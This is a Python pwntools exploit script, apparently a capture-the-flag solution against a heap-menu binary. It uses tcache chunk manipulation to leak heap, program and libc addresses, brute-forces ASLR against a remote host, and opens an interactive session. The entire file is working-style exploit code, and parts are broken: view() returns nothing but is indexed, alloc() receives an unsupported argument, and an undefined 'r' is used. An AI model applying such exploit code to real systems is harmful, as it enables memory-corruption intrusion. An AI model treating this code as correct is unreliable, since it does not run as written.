#!/usr/bin/env python3

import pwn
import random

exe = pwn.ELF("./main_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.binary = exe
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
pwn.context.timeout = 2000

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
b* main
source ~/Downloads/pwndbg/gdbinit.py
continue
'''.format(**locals())

io = start()

def alloc(size, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(size).encode())
    io.sendlineafter(b": ", data)

def delete(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())

def view(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b": ", str(idx).encode())

"""
alloc(0x10, b"YY")
alloc(0x10, b"YY")
alloc(0x10, b"YY")
alloc(0x10, b"YY")
alloc(0x10, b"YY")
alloc(0x10, b"YY")

for i in range(6):
    delete(i)

for i in range(7, 7+7):
    alloc(100, b"Y")

alloc(100, b"YY")
alloc(100, b"YY")
alloc(100, b"YY")
alloc(100, b"YY")

for i in range(7, 7+7):
    delete(i)

delete(16)
"""

def attach_gdb():
    if pwn.args.GDB:
        pwn.gdb.attach(r, gdbscript="""
source ~/Downloads/pwndbg/gdbinit.py
        """)

def run():
    global io

    alloc(0x20, b"abc")
    alloc(0x30, b"def")
    delete(0)
    delete(1)
    alloc(24, b"")

    bss_offt = 0x4160

    if pwn.args.REMOTE:
        heap = ((pwn.u64(view(2)[:8]) << 12) & 0xfffffffffff00000) | 0x11000 # bruteforce
        exe.address = heap-0x100000
    # heap = int(input("heap : "), 16)
    # print(f"heap @ {hex(heap)}")
    else:
        heap = (((pwn.u64(view(2)[:8]) & ~0xff) | 0x5a) << 12)
        exe.address = heap = (((pwn.u64(view(2)[:8]) & ~0xff) | 0x54) << 12)

    alloc(0x40, b"abc")
    alloc(0x50, b"def")
    delete(3)
    delete(4)
    got_offset = 0x3f90
    alloc(24, pwn.p64(bss_offt+8) + pwn.p64(1) + pwn.p64(exe.address), newline=False)
    leak = view(3)

    """
0x1e04000
0x1f49000
0x1e67000
0x104d000
0xdec000
0x513000
0xdad000
0xa92000
0x640000
0x1db7000
    """

    offset = 0
    if leak[:4] == b"\x7fELF":
        pass
    elif leak[:4] == b"\xf3\x0f\x1e\xfa":
        offset = 0x1000
    elif leak[:4] == b"\x01\x00\x02\x00":
        offset = 0x1000 * random.randint(2, 3)
    # elif leak == b'[-] failed to write from buffer\n':
    else:
        pass
        r.close()
        return False

    if pwn.args.LOCAL:
        assert(not offset)

    exe.address -= offset
    got_offset -= offset
    bss_offt -= offset

    print(hex(offset))
    libc.address = pwn.u64(leak[got_offset:got_offset+8]) - libc.sym["free"]
    print(f"exe @ {hex(exe.address)}")
    print(f"libc @ {hex(libc.address)}")

    attach_gdb()

    heap = pwn.u64(leak[bss_offt - 0x100:bss_offt - 0x100 +8]) - 0x2a0 
    pwn.log.info(f"heap: {hex(heap)}")


    io.interactive()

if pwn.args.REMOTE:
    i = 0
    while not run():
        print(i)
        i += 1
        pass
        # break
else:
    run()